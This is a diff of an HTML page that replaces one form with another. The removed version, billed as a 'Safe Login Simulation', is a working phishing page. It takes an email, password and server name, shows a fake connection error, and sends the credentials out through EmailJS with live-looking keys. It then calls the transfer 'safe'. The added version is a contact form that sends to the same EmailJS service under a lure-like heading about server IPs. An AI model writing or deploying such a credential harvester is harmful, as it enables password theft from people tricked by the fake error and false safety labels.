@@ -1,60 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Safe Login Lab</title>
-
-  <!-- EmailJS setup -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EmailJS Form</title>
+  <!-- EmailJS SDK -->
   <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
-  <script type="text/javascript">
-     (function(){
-        emailjs.init("f0SVFShSGNOwyB-sm"); // Your Public Key / User ID
-        console.log("EmailJS initialized"); // Debug
-     })();
-  </script>
+  <style>
+    /* Body & container */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000; /* Black background */
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding-top: 50px;
+    }
+
+    .container {
+      width: 500px; /* Medium size */
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255,0,0,0.5);
+    }
+
+    /* Header */
+    h1 {
+      color: red;
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 22px;
+    }
+
+    /* Form fields */
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      border: none;
+      font-size: 14px;
+      background-color: #222;
+      color: #fff;
+    }
+
+    input::placeholder, textarea::placeholder {
+      color: #888;
+    }
+
+    /* Button */
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: red;
+      color: #fff;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    button:hover {
+      background-color: #ff4d4d;
+    }
+
+    /* Error / Success messages */
+    .message {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .error {
+      color: red;
+    }
+
+    .success {
+      color: limegreen;
+    }
+  </style>
 </head>
 <body>
-  <h1 style="color: darkred;">Safe Login Simulation</h1>
-  <p>Enter email, password, and server name to see the simulation:</p>
 
-  <form id="loginForm">
-    <input type="text" id="email" placeholder="Email" required><br><br>
-    <input type="password" id="password" placeholder="Password" required><br><br>
-    <input type="text" id="server" placeholder="Server Name" required><br><br>
-    <button type="submit">Work</button>
-  </form>
-
-  <p id="message" style="color: blue; font-weight: bold;"></p>
+  <div class="container">
+    <h1>Know who is using multiple IP's in your server</h1>
+    <form id="emailForm">
+      <input type="text" id="name" placeholder="Your Name" required>
+      <input type="email" id="email" placeholder="Your Email" required>
+      <input type="text" id="title" placeholder="Subject" required>
+      <textarea id="message" placeholder="Your Message" required></textarea>
+      <button type="submit">Send Message</button>
+      <div id="formMessage" class="message"></div>
+    </form>
+  </div>
 
   <script>
-    const loginForm = document.getElementById("loginForm");
-    loginForm.addEventListener("submit", function(event) {
-      event.preventDefault();
+    // Initialize EmailJS
+    emailjs.init("YOUR_PUBLIC_KEY"); // replace with your EmailJS public key
 
-      console.log("Form submitted"); // Debug
+    const form = document.getElementById("emailForm");
+    const formMessage = document.getElementById("formMessage");
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const server = document.getElementById("server").value;
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
 
-      // Show a fake error message
-      document.getElementById("message").innerText = "Error: Could not connect to server.";
+      // Clear previous messages
+      formMessage.style.display = "none";
 
-      console.log("Sending email with data:", {email, password, server}); // Debug
-
+      // Send email
       emailjs.send("service_lspaiuv", "template_w3426ag", {
-        email: email,
-        password: password,
-        server: server
+        name: document.getElementById("name").value,
+        email: document.getElementById("email").value,
+        title: document.getElementById("title").value,
+        message: document.getElementById("message").value,
+        time: new Date().toLocaleString()
       })
-      .then(function(response) { 
-         console.log("Email sent successfully:", response); // Debug
-         document.getElementById("message").innerText = "Test email sent safely!";
-      })
-      .catch(function(error) {
-         console.error("Failed to send email:", error); // Debug
-         document.getElementById("message").innerText = "Failed to send email: " + error;
+      .then(function(response) {
+        formMessage.textContent = "Message sent successfully!";
+        formMessage.className = "message success";
+        formMessage.style.display = "block";
+        form.reset();
+        setTimeout(() => { formMessage.style.display = "none"; }, 2000);
+      }, function(error) {
+        formMessage.textContent = "Failed to send message. Please try again.";
+        formMessage.className = "message error";
+        formMessage.style.display = "block";
+        setTimeout(() => { formMessage.style.display = "none"; }, 2000);
       });
     });
   </script>
+
 </body>
 </html>
